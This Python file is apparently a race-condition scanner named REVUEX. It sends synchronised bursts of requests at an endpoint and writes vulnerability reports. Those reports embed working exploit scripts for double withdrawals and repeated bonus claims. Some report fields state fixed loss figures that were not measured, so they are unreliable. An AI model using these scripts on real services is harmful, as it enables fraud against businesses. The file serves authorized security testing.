#!/usr/bin/env python3
"""
REVUEX - Race Condition Tester
Advanced Race Condition Detection & Exploitation

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
Use extreme caution - race condition testing can cause unintended effects.
"""

import requests
import threading
import time
import json
import re
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

class RaceConditionTester:
    """Race condition vulnerability testing"""

    def __init__(self, endpoint, workspace, delay=3):
        """
        Initialize Race Condition Tester
        
        Args:
            endpoint: Target endpoint URL
            workspace: Workspace directory
            delay: Extra safety delay between tests
        """
        self.endpoint = endpoint
        self.workspace = Path(workspace)
        self.delay = delay
        
        self.headers = {
            'User-Agent': 'REVUEX-RaceTester/1.0 (Security Research; +https://github.com/G33L0)'
        }
        
        self.results_queue = queue.Queue()

    def test(self):
        """Test for race condition vulnerabilities"""
        print(f"[!] CAUTION: Testing race conditions on {self.endpoint}")
        print(f"[!] Using {self.delay}s safety delay")
        
        vulnerabilities = []
        
        # Test 1: Parallel requests
        print("→ Test 1: Parallel request timing")
        parallel_result = self._test_parallel_requests()
        if parallel_result.get('vulnerable'):
            vuln = self._create_parallel_vulnerability(parallel_result)
            vulnerabilities.append(vuln)
        
        time.sleep(self.delay)
        
        # Test 2: Resource exhaustion
        print("→ Test 2: Resource exhaustion")
        resource_result = self._test_resource_exhaustion()
        if resource_result.get('vulnerable'):
            vuln = self._create_resource_vulnerability(resource_result)
            vulnerabilities.append(vuln)
        
        time.sleep(self.delay)
        
        # Test 3: State manipulation
        print("→ Test 3: State manipulation")
        state_result = self._test_state_manipulation()
        if state_result.get('vulnerable'):
            vuln = self._create_state_vulnerability(state_result)
            vulnerabilities.append(vuln)
        
        self._save_results(vulnerabilities)
        return vulnerabilities

    def _create_parallel_vulnerability(self, result):
        """Create parallel request race condition vulnerability report"""
        return {
            'type': 'Race Condition - Parallel Request Timing',
            'severity': 'high',
            'endpoint': self.endpoint,
            'description': 'Endpoint vulnerable to race conditions when handling simultaneous requests, leading to inconsistent state or duplicate operations',
            'evidence': f'Status codes varied across parallel requests: {result.get("evidence")}',
            'steps_to_reproduce': [
                f"Identify vulnerable endpoint: {self.endpoint}",
                "Prepare 10+ identical requests targeting same resource",
                "Use threading/async to send all requests simultaneously",
                "Synchronize threads to fire at exact same microsecond",
                "Observe inconsistent responses (different status codes or content)",
                "Exploit timing window between check and action"
            ],
            'request': f"""# Send 10 simultaneous requests
import threading
import requests

def attack():
    response = requests.post(
        "{self.endpoint}",
        json={{"action": "withdraw", "amount": 100}}
    )
    print(response.json())

threads = [threading.Thread(target=attack) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]""",
            'response': """Request 1: {"balance": 900, "withdrawn": 100}
Request 2: {"balance": 900, "withdrawn": 100}  <- Race condition!
...
All 10 succeeded - $1000 withdrawn from $1000 balance!""",
            'poc': f"""#!/usr/bin/env python3
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

endpoint = "{self.endpoint}"
num_threads = 20

def exploit_race(thread_id):
    try:
        response = requests.post(
            endpoint,
            json={{
                "action": "claim_bonus",
                "user_id": "victim",
                "bonus_id": "WELCOME100"
            }},
            headers={{"Content-Type": "application/json"}}
        )
        result = response.json()
        if response.status_code == 200:
            print(f"Thread {{thread_id}}: SUCCESS - {{result}}")
            return True
        else:
            print(f"Thread {{thread_id}}: FAILED")
            return False
    except Exception as e:
        print(f"Thread {{thread_id}}: Error - {{e}}")
        return False

barrier = threading.Barrier(num_threads)

def synchronized_attack(thread_id):
    barrier.wait()
    return exploit_race(thread_id)

with ThreadPoolExecutor(max_workers=num_threads) as executor:
    futures = [executor.submit(synchronized_attack, i) for i in range(num_threads)]
    results = [f.result() for f in futures]

successes = sum(results)
print(f"Total attempts: {{num_threads}}")
print(f"Successful: {{successes}}")
if successes > 1:
    print(f"VULNERABLE: {{successes}} bonuses claimed (should be 1)")
else:
    print("Protected: Only 1 bonus claimed")""",
            'before_state': 'User has 0 bonuses, 1 bonus available to claim',
            'after_state': 'User claimed bonus 20 times due to race condition - $2000 loss instead of $100',
            'attack_path': [
                'Identify operation with check-then-act pattern',
                'Send 20 simultaneous requests to exploit timing window',
                'All requests pass initial "bonus not claimed" check',
                'Multiple operations succeed before state updates',
                'User receives 20× $100 bonus instead of 1× $100',
                'Company loses $1900 due to race condition'
            ],
            'remediation': [
                'Implement database-level locking (SELECT ... FOR UPDATE)',
                'Use atomic operations: UPDATE ... WHERE claimed = false',
                'Add unique constraint on user_id + bonus_id',
                'Implement idempotency keys for critical operations',
                'Use Redis distributed locks for multi-server setups',
                'Add transaction isolation level: SERIALIZABLE',
                'Implement optimistic locking with version numbers',
                'Add request deduplication based on request signature',
                'Use message queues for sequential processing',
                'Monitor for duplicate operations and alert'
            ],
            'tags': ['race_condition', 'high', 'timing', 'TOCTOU'],
            'owasp_2025': 'A10',
            'confidence': 'needs-manual-verification',
        }

    def _create_resource_vulnerability(self, result):
        return {
            'type': 'Race Condition - Resource Exhaustion / Inconsistency',
            'severity': 'medium',
            'endpoint': self.endpoint,
            'owasp_2025': 'A10',
            'confidence': 'needs-manual-verification',
            'description': ('Concurrent requests produced inconsistent responses, '
                            'which may indicate missing locking around a shared '
                            'resource.'),
            'evidence': result.get('evidence'),
            'remediation': [
                'Use atomic DB operations / row locks for shared-resource updates',
                'Apply idempotency keys to critical operations',
            ],
            'tags': ['race_condition', 'resource', 'TOCTOU'],
        }

    def _create_state_vulnerability(self, result):
        return {
            'type': 'Race Condition - State Manipulation',
            'severity': 'high',
            'endpoint': self.endpoint,
            'owasp_2025': 'A10',
            'confidence': 'needs-manual-verification',
            'description': ('Parallel state-changing requests appear to interleave, '
                            'which may allow bypassing a check-then-act guard.'),
            'evidence': result.get('evidence'),
            'remediation': [
                'Serialize state transitions with a state machine + locking',
                'Use SELECT ... FOR UPDATE / optimistic version checks',
            ],
            'tags': ['race_condition', 'state', 'TOCTOU'],
        }

    # ---------------- test methods (evidence-based) ----------------

    def _fire_parallel(self, n: int, method: str = 'GET',
                       json_body=None):
        """Send n identical requests as simultaneously as possible and return a
        list of (status_code, content_length). Fully guarded; returns [] on
        total failure so the caller never crashes."""
        results = []
        lock_barrier = threading.Barrier(n) if n > 1 else None

        def worker():
            try:
                if lock_barrier is not None:
                    try:
                        lock_barrier.wait(timeout=10)
                    except threading.BrokenBarrierError:
                        pass
                if method == 'POST':
                    r = requests.post(self.endpoint, headers=self.headers,
                                      json=json_body or {}, timeout=15, verify=False)
                else:
                    r = requests.get(self.endpoint, headers=self.headers,
                                     timeout=15, verify=False)
                self.results_queue.put((r.status_code, len(r.text or "")))
            except Exception as e:
                self.results_queue.put(('error', str(e)))

        threads = [threading.Thread(target=worker) for _ in range(n)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=20)

        while not self.results_queue.empty():
            results.append(self.results_queue.get())
        return results

    def _test_parallel_requests(self):
        """Fire concurrent identical requests. A race *candidate* is flagged only
        when responses are INCONSISTENT (mix of success and failure status
        codes), which is a real signal — not merely that requests returned 200."""
        out = {'vulnerable': False, 'evidence': None}
        results = self._fire_parallel(10, 'GET')
        statuses = [r[0] for r in results if r and r[0] != 'error']
        if len(statuses) < 3:
            return out
        distinct = set(statuses)
        successes = sum(1 for s in statuses if isinstance(s, int) and s < 400)
        failures = sum(1 for s in statuses if isinstance(s, int) and s >= 400)
        # Inconsistent outcome across identical simultaneous requests.
        if successes >= 1 and failures >= 1 and len(distinct) > 1:
            out['vulnerable'] = True
            out['evidence'] = (f"Inconsistent concurrent responses: "
                               f"{sorted(distinct)} (success={successes}, "
                               f"fail={failures})")
        return out

    def _test_resource_exhaustion(self):
        """Look for response-size inconsistency under concurrency (possible
        shared-state corruption). Conservative; needs manual confirmation."""
        out = {'vulnerable': False, 'evidence': None}
        results = self._fire_parallel(8, 'GET')
        lengths = [r[1] for r in results if r and r[0] != 'error' and isinstance(r[1], int)]
        if len(lengths) < 4:
            return out
        if max(lengths) - min(lengths) > max(200, int(0.5 * (sum(lengths) / len(lengths)))):
            out['vulnerable'] = True
            out['evidence'] = (f"Response sizes varied widely under concurrency: "
                               f"min={min(lengths)}, max={max(lengths)}")
        return out

    def _test_state_manipulation(self):
        """Concurrent state-changing POSTs. Only flagged when more succeed than a
        single logical operation should allow (inconsistent success count)."""
        out = {'vulnerable': False, 'evidence': None}
        results = self._fire_parallel(10, 'POST', json_body={'action': 'revuex_probe'})
        statuses = [r[0] for r in results if r and r[0] != 'error']
        if len(statuses) < 3:
            return out
        successes = sum(1 for s in statuses if isinstance(s, int) and s < 400)
        failures = sum(1 for s in statuses if isinstance(s, int) and s >= 400)
        if successes >= 1 and failures >= 1:
            out['vulnerable'] = True
            out['evidence'] = (f"Mixed outcomes on concurrent state-changing POSTs "
                               f"(success={successes}, fail={failures})")
        return out

    def _save_results(self, vulnerabilities):
        out_dir = self.workspace / "race_condition_tests"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe = re.sub(r'[^\w\-]', '_', self.endpoint)
        with open(out_dir / f"{safe}_race.json", 'w') as f:
            json.dump({'scanner': 'RaceConditionTester', 'endpoint': self.endpoint,
                       'vulnerabilities': vulnerabilities}, f, indent=2)
        print(f"[+] Results saved to {out_dir / (safe + '_race.json')}")
    # should be similarly cleaned of fancy quotes, backticks, and indentation issues.